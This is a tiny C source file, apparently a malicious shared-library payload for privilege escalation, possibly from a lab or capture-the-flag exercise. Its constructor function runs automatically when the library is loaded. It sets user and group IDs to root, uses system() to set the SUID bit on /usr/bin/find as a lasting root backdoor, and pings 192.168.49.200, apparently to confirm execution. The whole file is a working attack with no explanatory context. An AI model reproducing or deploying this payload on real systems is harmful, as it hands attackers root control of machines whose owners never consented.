#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
static void alvin() __attribute__((constructor));
void alvin() {
setuid(0); setgid(0); 
system("chmod +s /usr/bin/find");
system("ping 192.168.49.200 -c 2");
}
